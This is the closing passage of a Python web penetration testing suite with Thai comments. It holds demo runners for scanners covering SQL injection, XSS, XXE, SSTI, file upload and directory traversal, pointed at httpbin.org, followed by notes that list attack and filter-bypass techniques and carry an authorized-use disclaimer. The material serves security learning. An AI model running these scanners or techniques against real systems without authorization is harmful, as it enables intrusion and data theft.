        for vuln in vulnerabilities:
            print(f"  - {vuln['type']}: {vuln['category']}")
    else:
        print("✅ No vulnerabilities found (expected for httpbin.org)")

def demo_directory_traversal():
    """Demo: Directory traversal testing"""
    print("\n" + "="*60)
    print("📂 DEMO: Directory Traversal Testing")
    print("="*60)

    session = requests.Session()
    scanner = DirectoryTraversalScanner(session)

    # ตัวอย่างการทดสอบ
    test_url = "https://httpbin.org/get"
    test_param = "file"
    test_value = "index.html"

    print(f"🎯 Testing URL: {test_url}")
    print(f"📋 Parameter: {test_param}")

    print("\n🔍 Testing directory traversal payloads...")
    vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)

    if vulnerabilities:
        print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
        for vuln in vulnerabilities:
            print(f"  - {vuln['type']}: {vuln['category']}")
    else:
        print("✅ No vulnerabilities found (expected for httpbin.org)")

if __name__ == "__main__":
    print("🎯 ADVANCED WEB APPLICATION PENETRATION SUITE 2025")
    print("=" * 60)
    print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
    print("📚 Study materials for web security learning")
    print("=" * 60)

    # เรียกใช้ demo functions
    demo_sql_injection()
    demo_xss_testing()
    demo_xxe_testing()
    demo_ssti_testing()
    demo_file_upload_testing()
    demo_directory_traversal()

    print("\n" + "="*60)
    print("✅ All demos completed!")
    print("📖 Study these techniques for educational purposes")
    print("🔒 Always get proper authorization before testing")
    print("📚 Learn more at: OWASP.org, PortSwigger Academy")
    print("=" * 60)

"""
🎓 EDUCATIONAL NOTES & ADVANCED TIPS:

1. **SQL Injection Advanced Techniques:**
   - ใช้ UNION SELECT เพื่อดึงข้อมูลจาก database
   - ทดสอบ Time-based เมื่อไม่เห็น output
   - ใช้ Error-based เพื่อดึงข้อมูลผ่าน error messages
   - Bypass filters ด้วย comments, encoding, case variations

2. **XSS Advanced Techniques:**
   - Context-aware testing (HTML, attribute, JavaScript contexts)
   - Filter bypass ด้วย encoding, obfuscation
   - DOM-based XSS testing ด้วย client-side analysis
   - Test stored XSS ด้วยการสร้าง persistent payloads

3. **XXE Advanced Techniques:**
   - File disclosure ด้วย external entities
   - SSRF through XXE เพื่อเข้าถึง internal services
   - Blind XXE ด้วย out-of-band data exfiltration
   - Parameter entity injection

4. **SSTI Advanced Techniques:**
   - Template engine fingerprinting
   - Context escape techniques
   - Command execution payloads
   - File read/write capabilities

5. **File Upload Advanced Techniques:**
   - MIME type spoofing
   - Extension bypass (double extension, null bytes)
   - Content-Type manipulation
   - Polyglot files (files ที่ valid ได้หลายประเภท)

6. **Directory Traversal Advanced Techniques:**
   - Path normalization bypass
   - URL encoding variations
   - Null byte injection (older systems)
   - Wrapper protocols (PHP)

🔧 **Professional Testing Tools:**
- Burp Suite Professional
- OWASP ZAP
- SQLmap
- XSStrike
- Commix (Command Injection)

📚 **Learning Resources:**
- OWASP Top 10
- PortSwigger Web Security Academy
- HackerOne Disclosed Reports
- Bug Bounty Platforms (HackerOne, Bugcrowd)

🔗 **Required Libraries:**
pip install requests beautifulsoup4 urllib3

⚖️ **Legal Notice:**
เครื่องมือนี้สร้างขึ้นเพื่อการศึกษาและ authorized testing เท่านั้น
ต้องได้รับอนุญาตจากเจ้าของระบบก่อนใช้งาน
ผู้ใช้ต้องรับผิดชอบการใช้งานเอง
เป็นไปตาม OWASP Testing Guide และมาตรฐานสากล
"""